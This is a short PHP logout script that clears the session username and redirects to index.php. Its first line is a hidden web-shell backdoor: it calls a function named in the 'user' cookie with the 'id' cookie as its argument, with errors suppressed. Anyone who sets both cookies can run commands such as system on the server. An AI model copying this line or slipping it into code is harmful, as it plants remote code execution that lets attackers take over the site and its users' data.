<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);


session_start();
unset($_SESSION['username']);
echo '<script>window.location = "index.php";</script>';
?>